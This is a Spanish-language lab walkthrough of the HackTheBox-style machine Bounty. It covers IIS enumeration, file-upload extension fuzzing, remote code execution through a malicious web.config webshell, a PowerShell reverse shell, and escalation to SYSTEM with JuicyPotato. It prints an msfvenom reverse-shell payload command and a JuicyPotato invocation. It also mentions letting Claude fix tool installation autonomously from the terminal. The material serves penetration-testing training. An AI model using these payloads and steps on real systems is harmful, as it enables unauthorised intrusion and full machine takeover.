La máquina que finalmente se trabaja (Bounty) resulta ser la más instructiva hasta ahora en términos de mentalidad de auditoría, porque obliga a salir del sota-caballo-rey habitual: el servidor es Windows con IIS y [ASP.NET](http://asp.net/), los diccionarios de siempre no dan resultados, y el único vector de subida de archivos acepta exclusivamente extensiones que no son las esperadas. **Por qué esta máquina es diferente: Windows, IIS y** [**ASP.NET**](http://asp.net/)

Al confirmar TTL 127 en el ping, queda claro que es Windows. Nmap sobre el puerto 80 revela IIS (Internet Information Services) con [ASP.NET](http://asp.net/). Esto cambia inmediatamente toda la metodología de enumeración.

- **La idea clave:** los diccionarios que vienen por defecto en Cali (SecList, Directory-List-Medium) están diseñados para Apache y PHP; lanzarlos contra un IIS produce muy pocos resultados, no porque no haya nada, sino porque los nombres de directorios y archivos típicos de un entorno Windows/[ASP.NET](http://asp.net/) no están en esos diccionarios
    
- El mismo principio aplica a las extensiones: buscar .php en un servidor [ASP.NET](http://asp.net/) es inútil; hay que buscar .aspx, .asp, .config, .net
    
- Se presenta **Shortscan** como herramienta especializada en enumeración de IIS (incluye su propio wordlist con rutas típicas de entornos Microsoft), y se demuestra cómo instalarla cuando las herramientas de siempre no están disponibles — incluyendo el recurso de conectar Claude al terminal para que resuelva el problema de instalación de forma autónoma
    
- **La idea clave metodológica:** ante cualquier tecnología desconocida o poco familiar, el proceso es siempre el mismo — identificar la tecnología, buscar qué herramientas están especializadas en ella, y si no las tienes instaladas, buscar cómo instalarlas o alternativas equivalentes; no quedarse bloqueado porque Gobuster no da resultados

**Enumeración de extensiones con Burp Intruder: más allá del login**

El fuzzing de directorios encuentra un endpoint /transfer.aspx que permite subir archivos, y un directorio /UploadedFiles que devuelve 403. El primer instinto es intentar subir algo útil, pero antes hay que saber qué acepta.

- **La idea clave:** antes de intentar bypassear un filtro hay que saber exactamente qué acepta y qué no; probar a mano extensión por extensión es ineficiente — Burp Intruder en modo Sniper con una lista de extensiones es la forma correcta de automatizarlo en segundos
    
- La posición del Intruder se pone sobre el valor de la extensión en el filename del paquete de red (no sobre todo el nombre, solo sobre la extensión), y se itera con una lista que incluya .asp, .aspx, .php, .txt, .exe, .config, .net, .ps1, .jpg, .png, .jpeg, .pdf, etc.
    
- **La idea clave técnica:** cuando Burp Intruder encodea automáticamente los caracteres especiales (como el punto), los payloads llegan al servidor mal formados y todos dan el mismo error — hay que desactivar el URL-encoding del payload para que el punto llegue como punto literal
    
- Resultado del Intruder: el servidor acepta .jpg, .png, .jpeg (imágenes) y .config — todo lo demás es rechazado como "invalid file"
    
- **La idea clave sobre qué explotar:** entre aceptar imágenes y aceptar .config, siempre es más interesante el .config; embeberle código a una imagen para que se ejecute como shell es complejo y muy CTF; explotar un web.config en IIS para conseguir RCE es una técnica documentada y directamente aplicable

**RCE a través de web.config en IIS: el vector de ataque**

Se busca en Google "RCE web.config [ASP.NET](http://asp.net/) file upload" y se llega a un artículo de Medium que documenta exactamente el ataque: IIS tiene una mala configuración que permite que un web.config subido via file upload sobreescriba el del servidor y ejecute código arbitrario si se incluye un handler personalizado.

- La estructura del web.config malicioso combina la configuración estándar del archivo con un handler que ejecuta código ASP embebido, lo que permite pasar comandos del sistema operativo como parámetro en la URL
    
- El fichero resultante contiene en su interior una **webshell** mínima que recibe el parámetro cmd y ejecuta el comando en el servidor
    
- **La idea clave sobre el filename:** el archivo debe llamarse exactamente web.config (no web1.config, no shell.config) porque IIS busca ese nombre específico para la configuración del directorio
    
- Una vez subido, se accede a él a través de la URL con el parámetro ?cmd=id — si el servidor interpreta el handler, devuelve el resultado del comando; si no, devuelve un 404 o nada visible
    
- **La idea clave sobre por qué hay que encodear en URL:** el payload de reverse shell contiene espacios, ampersands, barras y otros caracteres especiales que la URL no puede transportar en texto plano; hay que encodear todo el payload en URL-encoding con Burp Decoder antes de enviarlo como valor del parámetro cmd
    

---

**De webshell a reverse shell en PowerShell**

Con la webshell ejecutando comandos, el siguiente paso es estabilizarla en una reverse shell real para tener una sesión interactiva cómoda.

- El servidor es Windows con PowerShell, por lo que el payload de reverse shell tiene que ser en PowerShell, no en Bash — [revshells.com](http://revshells.com/) con el modo PowerShell genera el one-liner adecuado
    
- Una vez generado el payload, se encodea completo en URL con Burp Decoder y se envía como valor de cmd; el NetCat en la máquina atacante captura la conexión
    
- **La idea clave:** si el primer intento no funciona, no significa que el vector esté mal — puede ser que el payload contenga caracteres que se han encodeado mal, que el fichero web.config haya sido limpiado por el proceso de mantenimiento de la máquina (HackTheBox limpia los ficheros subidos periódicamente), o que falte algún parámetro; hay que volver a subir el web.config y relanzar
    
- La shell obtenida es PowerShell (PS delante del prompt), que tiene comandos diferentes a bash: el equivalente de ls es dir, el equivalente de cd .. funciona igual pero las rutas usan \ en lugar de /, y el equivalente de wget es certutil -urlcache -split -f

**Escalada de privilegios: SeImpersonatePrivilege y JuicyPotato**

Desde la shell como el usuario de servicio del servidor (iusr), se ejecuta whoami /priv para listar los privilegios disponibles.

- **La idea clave:** en Windows, el equivalente del sudo -l de Linux es whoami /priv; hay que ejecutarlo siempre como primer paso en la enumeración post-explotación, igual que en Linux se ejecuta sudo -l y se busca en GTFOBins
    
- Aparece SeImpersonatePrivilege en estado Enabled — este privilegio permite al proceso actual impersonar tokens de otros usuarios, incluyendo SYSTEM
    
- **La idea clave sobre SeImpersonatePrivilege:** siempre que se vea este privilegio habilitado, la escalada va por **JuicyPotato** (o variantes como PrintSpoofer, RoguePotato según la versión de Windows) — es tan sistemático como GTFOBins: privilegio detectado → herramienta correspondiente
    
- JuicyPotato abusa de este privilegio para ejecutar un proceso como SYSTEM; ese proceso que ejecuta como SYSTEM es el payload que se le especifica, que en este caso es una nueva reverse shell crafteada con MSF Venom:
    

bash

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=IP LPORT=443 -f exe -o reverse.exe
```

- El payload reverse.exe se transfiere a la máquina víctima con certutil, JuicyPotato lo ejecuta como SYSTEM, y el NetCat en el puerto 443 captura la shell de administrador:
    

```
.\JuicyPotato.exe -t * -p reverse.exe -l 443
```

- El resultado es Authority\SYSTEM — acceso total a la máquina; a partir de ahí se puede leer el root.txt del escritorio del administrador con type c:\users\administrator\desktop\root.txt
    
- **La idea clave sobre MSF Venom:** no es Metasploit (que está prohibido en el OSCP más allá de un uso), sino una herramienta independiente de Metasploit Framework que genera payloads compilados para cualquier plataforma — se puede usar libremente en el eJPT y en el OSCP sin restricciones

**La cadena completa como patrón mental**

Carlos cierra la clase formulando explícitamente el patrón que se ha seguido, que es exactamente el mismo en todas las máquinas independientemente del vector:

- Enumerar → detectar vector de ataque → analizar qué acepta → buscar información si el vector es desconocido → explotar → acceder → estabilizar la shell → reverse shell → enumerar privilegios → escalar → reverse shell como admin → leer flags
    
- **La idea clave final:** lo que cambia entre máquinas no es la metodología sino el vector de entrada; en PHP es subir un .php directamente o bypassear con GIF89a; en [ASP.NET](http://asp.net/) es bypassear con web.config; en WordPress es explotar un plugin vulnerable con Drupalgeddon o WPScan; pero la secuencia mental es siempre la misma
